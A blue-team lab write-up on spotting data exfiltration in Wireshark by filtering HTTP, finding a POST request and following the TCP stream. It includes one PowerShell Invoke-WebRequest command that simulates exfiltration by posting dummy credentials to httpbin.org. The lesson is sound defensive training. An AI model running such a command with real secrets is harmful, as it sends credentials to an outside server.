# 🧠 Blue Team Lesson: Detecting Data Exfiltration Using Wireshark

---

# 🎯 Objective
Learn how to detect sensitive data being sent out of a network using Wireshark.

---

# 🧠 Scenario
An attacker has gained access to a machine and is attempting to send stolen data (e.g. usernames and passwords) to an external server.

The goal of this lab is to:

- Monitor network traffic
- Identify suspicious behaviour
- Detect potential data exfiltration

---

# 🧪 Lab Steps

## 1️⃣ Simulated Data Exfiltration

We used PowerShell to send data to an external server:

```powershell
Invoke-WebRequest -Uri "http://httpbin.org/post" -Method POST -Body "username=admin&password=1234"
```

This simulates an attacker sending stolen credentials across the network.

---

## 2️⃣ Captured Network Traffic

- Opened Wireshark
- Selected the active network adapter
- Started packet capture
- Ran the PowerShell command

Wireshark captured the outgoing HTTP traffic.

---

## 3️⃣ Filtered HTTP Traffic

Applied the following filter inside Wireshark:

```text
http
```

This allowed us to focus only on HTTP traffic.

---

## 4️⃣ Identified Suspicious Activity

A suspicious packet was identified:

```text
POST /post HTTP/1.1
```

This indicates data is being uploaded to an external server.

---

## 5️⃣ Inspected the Packet Contents

Using:

```text
Right Click Packet → Follow → TCP Stream
```

We were able to view the transmitted data:

```text
username=admin&password=1234
```

---

# 🚨 Key Findings

- Sensitive data was transmitted in plain text
- The request used HTTP (not encrypted)
- Data was sent to an external IP address
- This behaviour could indicate data exfiltration

---

# 🧠 Key Concepts Learned

## 🔹 GET vs POST

- GET = retrieving data
- POST = sending/uploading data

POST requests are more suspicious during investigations because they can indicate data exfiltration.

---

## 🔹 HTTP vs HTTPS

### HTTP
- Unencrypted traffic
- Visible in Wireshark
- Insecure

### HTTPS
- Encrypted traffic
- Data cannot easily be viewed
- More secure

---

## 🔹 Data Exfiltration

Data exfiltration is the process of stealing and transferring sensitive data out of a system or network.

---

# 🧠 Simple Explanation

Think of HTTP like sending a postcard through the mail.

Anyone who intercepts it can read the contents.

In this lab, Wireshark intercepted the traffic and revealed:

```text
username=admin&password=1234
```

This demonstrates why unencrypted traffic is dangerous.

---

# 💼 Real-World Relevance

In real environments, this type of activity could indicate:

- Stolen credentials being sent externally
- Malware communicating with attacker infrastructure
- Sensitive company data being leaked

---

# 🔍 Indicators of Suspicious Activity

Blue team analysts should look for:

- Unusual POST requests
- Traffic to unknown external IP addresses
- Plaintext credentials
- Large outbound data transfers
- Repeated uploads to external servers

---

# ✅ Conclusion

In this lab, we:

- Captured network traffic using Wireshark
- Identified HTTP POST requests
- Detected sensitive data being transmitted
- Analysed suspicious outbound traffic
- Understood how attackers exfiltrate data

---

# 🚀 Skills Gained

- Network traffic analysis
- Packet inspection
- Detecting suspicious behaviour
- Understanding data exfiltration techniques
- Wireshark investigation skills
